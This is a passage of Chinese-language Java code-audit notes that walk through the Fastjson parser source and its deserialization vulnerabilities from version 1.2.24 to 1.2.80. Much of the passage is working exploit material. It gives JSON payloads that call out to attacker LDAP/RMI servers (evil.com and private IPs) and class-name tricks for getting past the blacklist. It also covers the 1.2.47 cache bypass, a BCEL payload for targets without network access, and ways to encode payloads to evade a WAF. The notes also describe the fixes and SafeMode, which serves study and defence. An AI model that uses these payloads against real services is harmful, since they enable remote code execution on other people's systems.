+    - 此时该条件满⾜，会同样通过 scanSymbol 的⽅式获取值，**所以JSON中的值也是可以通过 unicode 、⼗六进制编码等⽅式去替换的**，这⾥获取到的 typename为 @type 所指定的值，即 fastjson.User ，**随后通过 `TypeUtils.loadClass` ⽅法加载Class：**。
+
+    - ```java
+            public static Class<?> loadClass(String className, ClassLoader classLoader) {
+                if (className == null || className.length() == 0) {
+                    return null;
+                }
+        
+                Class<?> clazz = mappings.get(className);
+        
+                if (clazz != null) {
+                    return clazz;
+                }
+        
+                if (className.charAt(0) == '[') {
+                    Class<?> componentType = loadClass(className.substring(1), classLoader);
+                    return Array.newInstance(componentType, 0).getClass();
+                }
+        
+                if (className.startsWith("L") && className.endsWith(";")) {
+                    String newClassName = className.substring(1, className.length() - 1);
+                    return loadClass(newClassName, classLoader);
+                }
+        ```
+
+    - 开头会有⼏个处理，⾸先会在 mappings 中尝试去通过 className 获取Class，mappings中存放着⼀些Java内置类：
+
+        - ![image-20221104092817868](./java代码审计.assets/image-20221104092817868.png)
+
+        - 如果此时获取不到，则会判断ClassName是否以 `[` 开头，如果是则通过`loadClass`⽅法加载Class，不过传⼊的ClassName会把 [ 给去掉，后⾯的 `L` 也是⼀个 原理。也就是又重新调用这个函数，**但是className会去掉前面的`[`或者`L`。这也又可以存在一个绕过过滤了。**
+
+        - 因为这⾥的后两个条件均不满⾜，且第⼀种从 mapping 获取类的⽅式是获取不到的，所以最后会通过ClassLoader的⽅式去加载Class
+
+            - ```java
+                ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
+                
+                if (contextClassLoader != null) {
+                    clazz = contextClassLoader.loadClass(className);
+                    mappings.put(className, clazz);
+                
+                    return clazz;
+                }
+                ```
+
+        - ⾄此，就获得了⼀个 @type 所指定类的Class对象。然后返回这个clazz。
+
+            - ![image-20221104093418213](./java代码审计.assets/image-20221104093418213.png)
+
+- 继续回到parseObject方法。在下边的代码中，会通过该Class对象获取到对应的Deserializer，并调⽤其deserialize⽅法：
+
+    - ```java
+        ObjectDeserializer deserializer = config.getDeserializer(clazz);
+        return deserializer.deserialze(this, clazz, fieldName);
+        ```
+
+    - 先跟 `getDeserializer` ⽅法，代码⽐较⻓，下⾯只截⼀些重点功能以及调⽤栈，⾸先该⽅法会从内置的Deserializer=>Class的Map中寻找Class对应的 Deserializer，因为没找到所以会通过其他⽅式去查找。在后⾯的代码中有⼀处⿊名单的判断：
+
+        - ```java
+                public ObjectDeserializer getDeserializer(Type type) {
+                    ObjectDeserializer derializer = this.derializers.get(type);
+                    if (derializer != null) {
+                        return derializer;
+                    }
+            
+                    if (type instanceof Class<?>) {
+                        return getDeserializer((Class<?>) type, type);//跳转到这里
+                    }
+            
+                    if (type instanceof ParameterizedType) {
+                        Type rawType = ((ParameterizedType) type).getRawType();
+                        if (rawType instanceof Class<?>) {
+                            return getDeserializer((Class<?>) rawType, type);
+                        } else {
+                            return getDeserializer(rawType);
+                        }
+                    }
+            ```
+
+        - **进入上面的重载方法,黑名单判断**
+
+            -  ```java
+                         String className = clazz.getName();
+                         className = className.replace('$', '.');
+                         for (int i = 0; i < denyList.length; ++i) {
+                             String deny = denyList[i];
+                             if (className.startsWith(deny)) {
+                                 throw new JSONException("parser deny : " + className);
+                             }
+                         }
+                 ```
+
+        - 在这⾥会判断Class是否在⿊名单中，如果在就直接抛出异常⽽不会继续寻找Deserializer，盲猜这⾥应该就是后续Fastjson漏洞修复加⿊明单的地⽅，**只不过 1.2.24 版本中的⿊名单只有Thread类**：
+
+            - ![image-20221104094719574](./java代码审计.assets/image-20221104094719574.png)
+
+        - 随后会与Class与他能够⽀持的⼀些Class进⾏匹配，如果匹配上了就通过对应的⽅式创建Deserializer，如果全都匹配不上则通过 createJavaBeanDeserializer ⽅法创建⼀个JavaBeanDeserializer：
+
+        - ⽹上的⽂章说的Fastjson会⽤到 asm 也是在此⽅法中，不过在我当前的环境下，会因为下⾯的判断不通过导致 asm 被设置为了False
+
+            - ```java
+                if (!Modifier.isPublic(superClass.getModifiers())) {
+                 asmEnable = false;
+                 break;
+                 }
+                ```
+
+        - 所以最终在我的环境下实际上是通过直接创建⼀个 JavaBeanDeserializer 对象来获取的Deserializer：
+
+            - ```java
+                if (!asmEnable) {
+                	return new JavaBeanDeserializer(this, clazz, type);
+                }
+                ```
+
+            - ```java
+                public JavaBeanDeserializer(ParserConfig config, Class<?> clazz, Type type){
+                        this(config, JavaBeanInfo.build(clazz, type, config.propertyNamingStrategy));
+                }
+                ```
+
+            - 在build方法中
+
+                - 在创建对象时，⾸先会调⽤ build ⽅法获取 JavaBeanInfo ，该⽅法中会获取Class对应的Field、Method以及Constructor
+
+                -  ```java
+                     Field[] declaredFields = clazz.getDeclaredFields();
+                     Method[] methods = clazz.getMethods();
+                     Constructor<?> defaultConstructor = getDefaultConstructor(builderClass == null ? clazz : builderClass);
+                     ```
+
+                - Constructor并不⼀定是⽆参构造⽅法，它会通过下⾯⼏种⽅式获取Constructor
+
+                    - ```java
+                        if (constructor.getParameterTypes().length == 0) {
+                         defaultConstructor = constructor;
+                        if ((types = constructor.getParameterTypes()).length == 1 && types[0].equals(clazz.getDeclaringClass())) {
+                         defaultConstructor = constructor;
+                        ```
+
+                    - 满⾜上⾯两个条件中的任何⼀个，就会被获取到，不过如果某个类中已经有了⽆参构造⽅法，就不会再进⼊第⼆个判断⽽是直接返回
+
+                - 在获取到Constructor后，会通过反射为其设置权限：
+
+                    - ```
+                        if (defaultConstructor != null) {
+                        	TypeUtils.setAccessible(defaultConstructor);
+                        }
+                        ```
+
+                - 随后会通过 for 循环的⽅式去遍历⽅法列表，并判断⽅法是否满⾜下⾯的条件：
+
+                    - ```
+                        if (methodName.length() >= 4 && !Modifier.isStatic(method.getModifiers()) && (method.getReturnType().equals(Void.TYPE)
+                        || method.getReturnType().equals(method.getDeclaringClass())))
+                        ```
+
+                - 如果都满⾜则会在if语句块⾥判断⽅法是否以 set 开头，**Fastjson这⾥有⼀个有意思的处理，他不是通过Field去获取对应的⽅法，⽽是获取 set 开头的⽅法，并 通过⽅法规则来获取Field，⽐如 setAge ，最终获取到的 Field 为 age** ，如果是布尔类型的Field，最终获取到的为 isAge ，对应的代码如下：
+
+                -  ```java
+                     
+                     ropertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
+                      
+                     Field field = TypeUtils.getField(clazz, propertyName, declaredFields);
+                     if (field == null && types[0] == Boolean.TYPE) {
+                      isFieldName = "is" + Character.toUpperCase(propertyName.charAt(0)) + propertyName.substring(1);
+                      field = TypeUtils.getField(clazz, isFieldName, declaredFields);
+                     }
+                     ```
+
+                - 着再来看看该⽅法中获取 get ⽅法的条件：
+
+                    - ```java
+                        for (Method method : clazz.getMethods()) { // getter methods
+                            ............................................
+                            if (methodName.length() >= 4 && !Modifier.isStatic(method.getModifiers()) && methodName.startsWith("get") &&
+                            Character.isUpperCase(methodName.charAt(3)) && method.getParameterTypes().length == 0 &&
+                            (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) ||
+                            AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class ==
+                            method.getReturnType())
+                        
+                        ```
+
+                - ⽐较重要的⼏点： 
+
+                    - Method不是静态的 
+                    - Method的返回值⻓度为0 
+                    - Method的返回类型要继承⾃上⾯所写的类 
+
+                - 如果这些条件满⾜，则该 get ⽅法就会被获取到，最终完成上⾯所有步骤后，获取到的JavaBeanInfo类如下
+
+                    - ![image-20221104101225638](./java代码审计.assets/image-20221104101225638.png)
+
+            - 在创建 JavaBeanDeserializer 对象的过程中，会对前⾯获取到的 JavaBeanInfo 获取到的信息进⾏下⼀步处理，⽐如在该⽅法中会创建Field对应的 Deserializer：
+
+                - ```java
+                     public FieldDeserializer createFieldDeserializer(ParserConfig mapping, //
+                                                                         JavaBeanInfo beanInfo, //
+                                                                         FieldInfo fieldInfo) {
+                            Class<?> clazz = beanInfo.clazz;
+                            Class<?> fieldClass = fieldInfo.fieldClass;
+                        
+                            Class<?> deserializeUsing = null;
+                            JSONField annotation = fieldInfo.getAnnotation();
+                            if (annotation != null) {
+                                deserializeUsing = annotation.deserializeUsing();
+                                if (deserializeUsing == Void.class) {
+                                    deserializeUsing = null;
+                                }
+                            }
+                        
+                            if (deserializeUsing == null && (fieldClass == List.class || fieldClass == ArrayList.class)) {
+                                return new ArrayListTypeFieldDeserializer(mapping, clazz, fieldInfo);
+                            }
+                        
+                            return new DefaultFieldDeserializer(mapping, clazz, fieldInfo);
+                        }
+                    ```
+
+            - 在Field的Class不为上⾯所示的Class的情况下，创建的FieldDeserializer实际上为 DefaultFieldDeserializer ，最终获取到的 JavaBeanDeserializer 是这样 的：
+
+                - ![image-20221104101730713](./java代码审计.assets/image-20221104101730713.png)
+
+            - 其中包含了 JavabeanInfo 以及 FieldDeserializer ，随后会调⽤该 Deserializer 的 deserialize ⽅法，该⽅法篇幅较⻓，我也仅截取关键 部分
+
+                - 在解析第⼀个Field时，会先通过前⾯获取到的构造⽅法创建⼀个对象
+
+                    - ```
+                        if (object == null && fieldValues == null) {
+                            object = createInstance(parser, type);
+                            if (object == null) {
+                            	fieldValues = new HashMap<String, Object>(this.fieldDeserializers.length);
+                            }
+                            childContext = parser.setContext(context, object, fieldName);
+                        }
+                        ```
+
+                - ![image-20221104102101122](./java代码审计.assets/image-20221104102101122.png)
+
+                - 随后会通过 FieldDeserializer#setValue 的⽅式去赋值：
+
+                    - ```
+                        fieldDeser.setValue(object, fieldValue);
+                        ```
+
+                - 该⽅法会通过⼀些条件判断来判断是否要调⽤ get 、 set 等⽅法，调⽤ get 的⽅法上⾯笔者已经记录过了，就是当满⾜返回值为那⼏个类时就会进⾏调⽤，如 果有 set ⽅法了，就会通过反射的⽅式调⽤ set ⽅法去赋值
+
+                    - ```
+                        method.invoke(object, value);
+                        ```
+
+                - 如果没有 set ⽅法，就会通过反射的⽅式为 Field 赋值
+
+                    - ```
+                        field.set(object, value);
+                        ```
+
+                - 那么如果某个属性的Type为⼀个第三⽅类，它是如何处理的？通过阅读源码我发现，如果属性是⼀个⾮原⽣JDK中的类，就会再次调 ⽤ JavaBeanDeserializer#deserialize ⽅法去获得Value，也就是说会把上⾯所记录的步骤都重复⼀次
+
+                    - ```
+                        if (this.fieldValueDeserilizer instanceof JavaBeanDeserializer) {
+                         JavaBeanDeserializer javaBeanDeser = (JavaBeanDeserializer)this.fieldValueDeserilizer;
+                         value = javaBeanDeser.deserialze(parser, fieldType, this.fieldInfo.name, this.fieldInfo.parserFeatures);
+                        
+                        ```
+
+- **最后赋值的时候是⼀样的，还是上⾯ setValue 的步骤，⾄此，Fastjson是如何从JSON还原对象的，我们已经通过源码分析的⽅式搞清楚了，下⾯总结⼀下**
+    - **JSON中的键&值均可使⽤unicode编码 & ⼗六进制编码（可⽤于绕过WAF检测）** 
+    - **JSON解析时会忽略双引号外的所有空格、换行、注释符（可⽤于绕过WAF检测）**
+    -  **为属性赋值相关的代码位于setValue⽅法中** 
+    - **反序列化时是可以调⽤ get ⽅法的，只是有⼀定的限制**
+
+##### 一个简单的fastjson漏洞利用demo
+
+- ```java
+    package fastjson;
+    import com.alibaba.fastjson.JSON;
+    import java.io.IOException;
+    public class Fj1_2_24 {
+        public static void main(String[] args) {
+            String json_payload = "{\"@type\":\"fastjson.Payload\",\"command\":\"calc\"}";
+            JSON.parseObject(json_payload);
+        }
+    }
+    class Payload{
+        private String command;
+        public void setCommand(String command) throws IOException {
+            Runtime.getRuntime().exec(command);
+        }
+    }
+    ```
+
+- 上⾯的反序列化过程其实很简单，根据 @type 创建完Payload对象后，会调⽤它的 setCommand ⽅法，此时即可触发笔者写下的恶意代码 Runtime.exec ，从而造成RCE。实际的漏洞也是如此，只不过笔者写的是最简单的⼀种⽅式，在⼤多数情况下的调⽤栈要⽐这复杂的多。下⾯我会通过对历史产⽣的Payload进⾏复 现，并通过POC来了解漏洞利⽤的原理，从⽽加深对Fastjson反序列化漏洞的印象
+
+##### **Fastjson  1.2.22 - 1.2.24 RCE **
+
+- FastJson在 1.2.22 - 1.2.24 版本中存在反序列化漏洞，主要原因FastJson⽀持的两个特性： fastjson反序列化时，JSON字符串中的 @type 字段，⽤来表明指定反序列化的⽬标恶意对象类。
+
+- fastjson反序列化时，字符串时会⾃动调⽤恶意对象的构造⽅法， setter ⽅法， getter ⽅法， 若这类⽅法中存在利⽤点，即可完成漏洞利⽤
+
+- **主要存在三种利用⽅式：**
+
+    -  JdbcRowSetImpl(JNDI) 。
+    - TemplatesImpl(Feature.SupportNonPublicField)，限制太大，要求原来的代码，传入了Feature.SupportNonPublicField。
+    - bcel传入字节码，fastjson不出网时候利用
+
+- **JNDI && JdbcRowSetImpl利⽤链：**
+
+    - jndi利用对jdk版本是有限制的。
+
+    - poc：
+
+        - ```java
+            package org.example;
+            
+            import com.alibaba.fastjson.JSON;
+            public class java1_2_24 {
+                public static void main(String[] args) {
+                    String PoC = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.50.183:1389/8kk9hw\", \"autoCommit\":true}";
+                    JSON.parse(PoC);
+                }
+            }
+            ```
+
+        - @type ：指定恶意利⽤类为 com.sun.rowset.JdbcRowSetImpl 
+
+        - dataSourceName ：指定 RMI / LDAP 恶意服务器，并调⽤ setDataSourceName 函数 
+
+        - autoCommit ：调⽤ setAutoCommit 函数。
+
+        - `JdbcRowSetImpl` 源码分析
+
+            - 这个类存在jre里面，和jdbc有关
+
+            - ```java
+                    public void setAutoCommit(boolean var1) throws SQLException {
+                        if (this.conn != null) {
+                            this.conn.setAutoCommit(var1);
+                        } else {
+                            this.conn = this.connect();
+                            this.conn.setAutoCommit(var1);
+                        }
+                
+                    }
+                ```
+
+            - 在该⽅法中会调⽤ connect ⽅法：
+
+            - ```java
+                 protected Connection connect() throws SQLException {
+                  if (this.conn != null) {
+                  	return this.conn;
+                  } else if (this.getDataSourceName() != null) {
+                  	try {
+                  		InitialContext var1 = new InitialContext();
+                  		DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+                 ```
+
+            - connect ⽅法中存在 lookup 的调⽤，存在JNDI注⼊，因为 dataSourceName 是我们可控的，所以思路很明确，利⽤JNDI注⼊来攻击，实际利⽤的⽅式有好⼏ 种，⽐如RMI、LDAP中的反序列化等，但是与Fastjson⽆关。
+
+    - **还有一个poc**
+
+        - ```
+              
+            {
+                "a":{
+                    "@type":"com.sun.rowset.JdbcRowSetImpl",
+                    "dataSourceName":"rmi://ip:9999/Test",
+                    "autoCommit":true
+                }
+            }
+            ```
+
+        - 根据我们上面分析parse源码和自己调试，value的对象会重新进入parse方法中，也就是和上一个poc一样。
+
+        - **有时候第一个poc没用，第二个有用，为什么呢？**
+    
+            - 是因为这时候，后台用的是`parseObject(String text, Class clazz)`.比如后台开发使用fastjson的注解形式开发的,底层就是`parseObject(String text, Class clazz)`
+            - **这也我们得到的Deserializer是clazz的Deserializer，这时候我们传入别的类就会报类型不匹配错误。**
+            - 但是如果我们再外面添加一层，这样外面的可以解析，里面的是自省方式解析，还是和原本parse(str)方式一样（可以自己调试代码查看）
+    
+        - demo
+    
+            - ```java
+                package fastjson;
+                import com.alibaba.fastjson.JSON;
+                class User{
+                    private String name;
+                    private int age;
+                    private Flag flag;
+                    public User(){
+                        System.out.println("User constructor has called.");
+                        this.name = "p1g3";
+                        this.age = 19;
+                        this.flag = new Flag();
+                    }
+                    public String getName() {
+                        System.out.println("getName has called.");
+                        return name;
+                    }
+                    public void setName(String name) {
+                        System.out.println("setName has called.");
+                        this.name = name;
+                    }
+                    public int getAge() {
+                        System.out.println("getAge has called.");
+                        return age;
+                    }
+                    public void setAge(int age) {
+                        System.out.println("setAge has called.");
+                        this.age = age;
+                    }
+                    public Flag getFlag() {
+                        System.out.println("getFlag has called.");
+                        return flag;
+                    }
+                    public void setFlag(Flag flag) {
+                        System.out.println("setFlag has called.");
+                        this.flag = flag;
+                    }
+                    @Override
+                    public String toString() {
+                        return "User{" +
+                                "name='" + name + '\'' +
+                                ", age=" + age +
+                                ", flag=" + flag +
+                                '}';
+                    }
+                }
+                class Flag{
+                    private String flag;
+                    public Flag(){
+                        System.out.println("Flag constructor has called.");
+                        this.flag = "flag{d0g3_learn_java}";
+                    }
+                    public String getFlag() {
+                        System.out.println("getFlag has called.");
+                        return flag;
+                    }
+                    public void setFlag(String flag) {
+                        System.out.println("setFlag has called.");
+                        this.flag = flag;
+                    }
+                }
+                public class Fj1_2_24 {
+                    public static void main(String[] args) {
+                        String PoC = "{\"a\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://10.13.138.57:1389/klw4lk\", \"autoCommit\":true}}";
+                        User user = JSON.parseObject(PoC, User.class);
+                
+                    }
+                }
+                
+                ```
+
+- 
+
+##### 1.2.25-1.2.41
+
+- 官⽅在1.2.25版本更新中，对1.2.22-1.2.24版本漏洞进⾏了修补。将之前默认开启的 `autoType` 设置为**默认关闭,也就是false**.
+
+    - 手动开启autoType
+
+    - ```java
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        ```
+
+- 1.2.25版本后对 `@type` 的处理会优先调⽤ `checkAutoType` ⽅ 法：
+
+- **autoTypeSupport选项**
+
+    - 当`autoTypeSupport`为false时候.(默认)
+
+        -  `checkAutoType`方法的最后会直接抛出异常
+
+            - ```java
+                if (!autoTypeSupport) {
+                	throw new JSONException("autoType is not support. " + typeName);
+                }
+                ```
+
+        - 但在前面,会有提前return的情况.这时候的逻辑是: **要求不匹配到黑名单，同时必须匹配到白名单的class,这样会提前return,就能正常反序列化,白名单默认为空**.但是这样poc就没用了,我们的类不是白名单里面的类
+
+            - ```java
+                        if (!autoTypeSupport) {
+                            for (int i = 0; i < denyList.length; ++i) {
+                                String deny = denyList[i];
+                                if (className.startsWith(deny)) {
+                                    throw new JSONException("autoType is not support. " + typeName);
+                                }
+                            }
+                            for (int i = 0; i < acceptList.length; ++i) {
+                                String accept = acceptList[i];
+                                if (className.startsWith(accept)) {
+                                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
+                
+                                    if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
+                                        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
+                                    }
+                                    return clazz;
+                                }
+                            }
+                        }
+                ```
+
+    - 当`AutoTypeSupport为True`时候会匹配黑名单,他会判断类名是否以⿊名单的内容开头,所以我们绕过黑名单就行了。
+
+        - ```java
+                    if (autoTypeSupport || expectClass != null) {
+                        for (int i = 0; i < acceptList.length; ++i) {
+                            String accept = acceptList[i];
+                            if (className.startsWith(accept)) {
+                                return TypeUtils.loadClass(typeName, defaultClassLoader);
+                            }
+                        }
+            
+                        for (int i = 0; i < denyList.length; ++i) {
+                            String deny = denyList[i];
+                            if (className.startsWith(deny)) {
+                                throw new JSONException("autoType is not support. " + typeName);
+                            }
+                        }
+                    }
+            ```
+
+        - 
+
+- 1.2.25-1.2.41绕过:
+
+    - 所以接下来所谓的绕过都是在服务端显性开启 `AutoTypeSupport`为True的情况下进行的。（这是一个很大的限制条件）
+
+    - 下个断点,看一下黑名单有哪些
+
+        - ```java
+            denyList = {String[22]@620}
+            0 = "bsh"
+            1 = "com.mchange"
+            2 = "com.sun."
+            3 = "java.lang.Thread"
+            4 = "java.net.Socket"
+            5 = "java.rmi"
+            6 = "javax.xml"
+            7 = "org.apache.bcel"
+            8 = "org.apache.commons.beanutils"
+            9 = "org.apache.commons.collections.Transformer"
+            10 = "org.apache.commons.collections.functors"
+            11 = "org.apache.commons.collections4.comparators"
+            12 = "org.apache.commons.fileupload"
+            13 = "org.apache.myfaces.context.servlet"
+            14 = "org.apache.tomcat"
+            15 = "org.apache.wicket.util"
+            16 = "org.codehaus.groovy.runtime"
+            17 = "org.hibernate"
+            18 = "org.jboss"
+            19 = "org.mozilla.javascript"
+            20 = "org.python.core"
+            21 = "org.springframework"
+            ```
+
+    - 他会判断类名是否以⿊名单的内容开头，如果是则抛出异常，因为我们使⽤的类为 `com.sun` ，所以能够成功命中规则，导致这⾥没能正确加载类。
+
+- 之前在parse分析过loadClass的⼀些特性，如果类以 `L...;` 或者以 [ 这种字符开头时，则在 loadClass 内部会将这些字符进⾏截断，⽐如
+
+    - ```java
+        Lcom.sun.; => com.sun.       L...;可以多次写  比如LLL....;;;
+        [com.sun. => com.sun.
+        ```
+
+    - 利⽤这种解析差异，就可以绕过这次的 checkAutoType 函数：
+
+        - ```json
+            {"a":{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://localhost:1389/Object","autoCommit":true}}
+            
+            
+            {"a":{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true]}}
+            ```
+
+
+##### 1.2.42安全补丁
+
+- 开发者为了增加安全分析的难度，将⿊名单中的类明⽂变成了类Hash进⾏⽐较判断。 `/com/alibaba/fastjson/parser/ParserConfig.java`
+
+    - 不过已经不需要⾃⼰去折腾了，github已经[有项⽬](https://github.com/LeadroyaL/fastjson-blacklist)汇总了类名-类Hash之间的对应关系
+
+- 修复方式
+
+    - 无非就是针对于 `L` 以及 ; 以及 `[` 的修复，但是这一次修复时只修复了 `L` ，⽽且修复⽅式⼗分奇葩：
+
+        - 判断了className前后是不是 `L` 和 ; ，如果是，就截取第⼆个字符和到倒数第⼆个字符。
+
+            - ```
+                        if ((((BASIC
+                                ^ className.charAt(0))
+                                * PRIME)
+                                ^ className.charAt(className.length() - 1))
+                                * PRIME == 0x9198507b5af98f0L)
+                        {
+                            className = className.substring(1, className.length() - 1);
+                        }
+                ```
+
+- 绕过：
+    - 绕过⽅式为类名开头两个 L ，结尾两个 ; ，这样删除⼀次开头结尾后的类名 为 `Lcom.sun.rowset.JdbcRowSetImpl;` ，不会触发⿊名单。
+
+    - 同时使用`[`也可以绕过
+
+    - ```json
+        {"a":{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://localhost:1389/Object","autoCommit":true}}
+        
+        
+        {"a":{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true]}}
+        ```
+
+##### 1.2.43安全补丁
+
+- 先判断类名是否符合 L----; 形式（ LL-----;; 以及多次重复也判断符合），若符合，则进⼀步精确判断类名是否为 LL-----;; 形式：
+    -  符合，就直接抛出异常，这⾥就过滤了两次及以上的开头和结尾的攻击类名。 
+    - 不符合，处理同上版本，删除开头和结尾的字符得到类名，传⼊⿊名单判断。 后续的处理和前⾯版本基本相似。
+    
+- 绕过
+
+    - 此时不可以使⽤ `L----;` 类型，但是同时`[`也可以绕过,并且变化了 `[{` ，为了反序列化解析的时候不会产⽣异常。
+
+    - ```java
+        {"a":{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true]}}
+        ```
+
+
+##### 1.2.44-1.2.45安全补丁:
+
+- 修复了1.2.43版本中 autoTypeSupport为 true时，恶意类名前添加 `[`的引发安全问题。
+
+- 对 `com.sun.rowset.JdbcRowSetImpl` 类的利⽤陷⼊了困境，于是诞⽣了有⼀定限制的新 Mybatis 利 ⽤链，可以直接绕过⿊名单。
+
+- POC
+
+    - ```java
+        String PoC = "
+        {\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"prope
+        rties\":{\"data_source\":\"rmi://localhost:1099/Exploit\"}}";
+        ```
+
+
+##### 1.2.46-1.2.47安全补丁
+
+- 补丁：
+    - 把ibatis加入黑名单
+- 绕过：
+    - 主要使⽤了 checkAutoType 函数处理逻辑上的⼀些缺陷并结合新的 java.lang.Class 利⽤链，利⽤ 缓存 mappings 从⽽绕过了⿊⽩名单的限制加载 com.sun.rowset.JdbcRowSetImpl 类。
+    - **通杀payload！: 无需AutoTypeSupport，没有黑白名单要求。**
+
+##### Fastjson < =1.2.47 通杀poc
+
+- 在上⾯的loadClass已经没有办法绕过时，有师傅挖到了⼀种⽆需开启 autoType 也能RCE的⽅式-缓存绕过，具体POC如下：
+
+    - ```java
+        {
+            "a":{
+                "@type":"java.lang.Class",
+                "val":"com.sun.rowset.JdbcRowSetImpl"
+            },
+            "b":{
+                "@type":"com.sun.rowset.JdbcRowSetImpl",
+                "dataSourceName":"rmi://evil.com:9999/Exploit",
+                "autoCommit":true
+            }
+        }
+        ```
+
+    - demo:
+
+        - 
+
+        - ```
+            package fastjson;
+            
+            import com.alibaba.fastjson.JSON;
+            import com.alibaba.fastjson.parser.ParserConfig;
+            
+            public class Fj1_2_47 {
+                public static void main(String[] args) {
+                    //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+                    String PoC = "[{\n" +
+                            " \"@type\": \"java.lang.Class\",\n" +
+                            " \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
+                            " },\n" +
+                            "{\n" +
+                            " \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +
+                            " \"dataSourceName\": \"ldap://10.13.138.57:1389/klw4lk\",\n" +
+                            " \"autoCommit\": true\n" +
+                            " }\n" +
+                            "]";
+                    JSON.parse(PoC);
+                }
+            }
+            ```
+
+- 在 Fastjson 对 `@type` 进⾏解析时，会先判断该类是否在⽩名单内，是就直接放⾏⽽不进⾏后续判断，此时第⼀次获取到的Class为 java.lang.Class ，该类对应的 Deserializer 为 MiscCodec ，在后续会调⽤其 deserialize ⽅法，在该⽅法中会⾸先获取到 val 所对应的值
+
+    - ![image-20221104182910352](./java代码审计.assets/image-20221104182910352.png)
+
+    - 这⾥的 objVal 即为 com.sun.rowset.JdbcRowSetImpl ，最后返回的是通过loadClass得到的该val所对应的Class对象：
+        - ![image-20221104182940778](./java代码审计.assets/image-20221104182940778.png)
+
+- 由于Fastjson具有缓存机制，所以默认会将每次 deserializer ⽅法获取到的value缓存在⼀个Map中：
+
+    - ![image-20221104183003568](./java代码审计.assets/image-20221104183003568.png)
+
+- 在第⼆次进⾏ checkAutoType ⽅法时，由于并没有开启 autoType 也没有expectClass，所以会暂时不进⾏第⼀次的⿊名单检查
+    - ![image-20221104183037027](./java代码审计.assets/image-20221104183037027.png)
+
+- 此时会直接从缓存中通过Name来获取Class对象，⽽前⾯通过 java.lang.Class 已经把该Class对象存⼊缓存了，此时可以正常获取到Class对象，于是就绕过 了 autoType 以及⿊名单
+- **对于这次绕过的修复⽅式是将 mapping 的缓存默认设置为False，这就导致攻击者没有办法从缓存中获得类，同时也⽆法绕过 autoType 了。**
+
+##### fastjson<=1.2.68：
+
+- expectClass绕过AutoType
+
+  - 找实现了AutoCloseable接⼝的⼦类中的危险操作。，并且不在黑名单中；
+  -  ```json
+       {"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}
+       {"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
+       {"@type":"com.caucho.config.types.ResourceRef","lookupName": "ldap://localhost:1389/Exploit", "value": {"$ref":"$.value"}}
+       
+       ```
+
+- 读文件
+
+    - ```
+        ```
+
+    - 
+
+- **并且从这个版本(1.2.68)开始，Fastjson 引入了safeMode功能，完全禁用autoType。所有的安全修复版本sec10也支持SafeMode配置。**
+
+    - 代码中设置开启SafeMode如下：
+
+      - ```java
+        ParserConfig.getGlobalInstance().setSafeMode(true);
+        ```
+
+      - 开启之后，就完全禁用AutoType即 `@type`了，这样就能防御住Fastjson反序列化漏洞了。
+
+
+- 修复方式简单粗暴，将j`ava.lang.Runnable`，`java.lang.Readable`和`java.lang.AutoCloseable`加 入了黑名单
+
+##### Fastjson 1.2.80 及之前版本存在 Throwable 反序列化漏洞
+
+> 浅蓝师傅
+
+- Fastjson 1.2.80 及之前版本使用黑白名单用于防御反序列化漏洞，经研究该防御策略在特定条件下可绕过默认 autoType 关闭限制，攻击远程服务器，风险影响较大。建议 Fastjson 用户尽快采取安全措施保障系统安全。
+
+##### fastjson不出网如何利用
+
+- https://www.cnblogs.com/R0ser1/p/15918626.html#%E5%89%8D%E8%A8%80
+
+- 利用BCEL
+
+- 环境
+
+    - Fastjson < =1.2.47 
+
+- poc
+
+    - ```json
+        {
+            {
+                "aaa": {
+                        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+                    //这里是tomcat>8的poc，如果小于8的话用到的类是
+                    //org.apache.tomcat.dbcp.dbcp.BasicDataSource
+                        "driverClassLoader": {
+                            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+                        },
+                        "driverClassName": "$$BCEL$$$l$8b$I$A$..."
+                }
+            }: "bbb"
+        }
+        
+        ```
+
+- 调用了get方法
+
+    - 首先在`{“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……}` 这一整段外面再套一层`{}`，这样的话会把这个整体当做一个JSONObject，会把这个当做key，值为bbb
+    - 将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法：
+    - 而且JSONObject是Map的子类，当调用`toString`的时候，会依次调用该类的getter方法获取值。然后会以字符串的形式输出出来。所以会调用到`getConnection`方法
+
+##### fastjson过waf
+
+- Fastjson默认会去除键、值外的空格、 \b 、 \n 、 \r 、 \f 等，同时还会⾃动将键与值进⾏unicode与⼗六进制解码。 这意味着下⾯的payload可以转换为多种形式
+
+    - ```json
+        {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.251.0.111:9999","autoCommit":true}
